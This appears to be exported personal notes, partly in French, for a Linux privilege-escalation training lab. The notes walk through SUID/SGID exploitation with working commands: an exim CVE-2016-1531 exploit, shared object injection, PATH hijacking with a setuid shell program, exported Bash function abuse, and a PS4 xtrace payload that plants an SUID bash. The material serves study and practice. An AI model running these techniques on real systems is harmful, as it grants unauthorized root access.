<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>SUID</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>SUID</h1><br/><br /><br />Verifier les permissions puis GTFOBins<br /><br /><br /><br /><br /><h3>SUID / SGID Executables - Known Exploits</h3><br /><br />Find all the SUID/SGID executables on the Debian VM:<br /><code>find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&gt; /dev/null</code><br />Note that /usr/sbin/exim-4.84-3 appears in the results. Try to find a known exploit for this version of exim. <a href="https://www.exploit-db.com/">Exploit-DB</a>, Google, and GitHub are good places to search!<br />A  local privilege escalation exploit matching this version of exim  exactly should be available. A copy can be found on the Debian VM at <strong>/home/user/tools/suid/exim/cve-2016-1531.sh</strong>.<br />Run the exploit script to gain a root shell:<br /><code>/home/user/tools/suid/exim/cve-2016-1531.sh</code><br /><br /><br /><br /><br /><br />----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br /><br /><h3>Shared Object Injection                            </h3><br /><br /><br />The <strong>/usr/local/bin/suid-so</strong> SUID executable is vulnerable to shared object injection.<br />First, execute the file and note that currently it displays a progress bar before exiting:<br /><code>/usr/local/bin/suid-so</code><br /><br />Run <strong>strace</strong> on the file and search the output for open/access calls and for &quot;no such file&quot; errors:<br /><code>strace /usr/local/bin/suid-so 2&gt;&amp;1 | grep -iE &quot;open|access|no such file&quot;</code><br />Note that the executable tries to load the <strong>/home/user/.config/libcalc.so</strong> shared object within our home directory, but it cannot be found.<br />Create the <strong>.config</strong> directory for the libcalc.so file:<br /><code>mkdir /home/user/.config</code><br />Example shared object code can be found at <strong>/home/user/tools/suid/libcalc.c</strong>. It simply spawns a Bash shell. Compile the code into a shared object at the location the <strong>suid-so</strong> executable was looking for it:<br /><code>gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c</code><br />Execute the <strong>suid-so</strong> executable again, and note that this time, instead of a progress bar, we get a root shell.<br /><code>/usr/local/bin/suid-so</code><br /><br /><strong>Remember to exit out of the root shell before continuing!</strong><br /><br /><br /><br />----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br /><br /><br /><h3>SUID / SGID Executables - Environment Variables</h3><br /><br /><br /><br />The <strong>/usr/local/bin/suid-env</strong> executable can be exploited due to  it inheriting the user&#39;s PATH environment variable and attempting to  execute programs without specifying an absolute path.<br />First, execute the file and note that it seems to be trying to start the apache2 webserver:<br /><code>/usr/local/bin/suid-env</code><br />Run strings on the file to look for strings of printable characters:<br /><code>strings /usr/local/bin/suid-env</code><br />One line (&quot;service apache2 start&quot;) suggests that the <strong>service</strong>  executable is being called to start the webserver, however the full  path of the executable (/usr/sbin/service) is not being used.<br /><br /><br />Compile the code located at <strong>/home/user/tools/suid/service.c</strong> into an executable called <strong>service</strong>. This code simply spawns a Bash shell:<br /><br />int main() {<br />        setuid(0);<br />        system(&quot;/bin/bash -p&quot;);<br />}<br /><br /><br /><br /><br /><code>gcc -o service /home/user/tools/suid/service.c</code><br />Prepend the current directory (or where the new service executable is located) to the PATH variable, and run the <strong>suid-env</strong> executable to gain a root shell:<br /><code>PATH=.:$PATH /usr/local/bin/suid-env</code><br /><br /><br /><br />----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br /><br /><br /><h3>SUID / SGID Executables - Abusing Shell Features (#1)</h3><br /><br />The <strong>/usr/local/bin/suid-env2</strong> executable is identical to <strong><small>/usr/local/bin/suid-env</small></strong><small> except that it uses the absolute path of the service executable (</small>/usr/sbin/service) to start the apache2 webserver.<br />Verify this with strings:<br /><code>strings /usr/local/bin/suid-env2<br /></code><br />In Bash versions <strong>&lt;4.2-048</strong>  it is possible to define shell functions with names that resemble file  paths, then export those functions so that they are used instead of any  actual executable at that file path.<br />Verify the version of Bash installed on the Debian VM is less than 4.2-048:<br /><code>/bin/bash --version</code><br />Create a Bash function with the name &quot;<strong>/usr/sbin/service</strong>&quot; that executes a new Bash shell (using -p so permissions are preserved) and export the function:<br /><code>function /usr/sbin/service { /bin/bash -p; }<br />export -f /usr/sbin/service</code><br />Run the <strong>suid-env2</strong> executable to gain a root shell:<br /><code>/usr/local/bin/suid-env2</code><br /><br /><br />---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br /><br /><br /><h3>SUID / SGID Executables - Abusing Shell Features (#2)</h3><br /><br /><br /><br />Note: This will not work on Bash versions 4.4 and above.<br /><small>When in debugging mode, Bash uses the environment variable </small><strong><small>PS4</small></strong><small> to display an extra prompt for debugging statements.</small><br /><br />Run the <strong>/usr/local/bin/suid-env2</strong>  executable with bash debugging enabled and the PS4 variable set to an  embedded command which creates an SUID version of /bin/bash:<br /><code>env -i SHELLOPTS=xtrace PS4=&#39;$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)&#39; /usr/local/bin/suid-env2</code><br />Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:<br /><code>/tmp/rootbash -p</code><br /></div></body></html>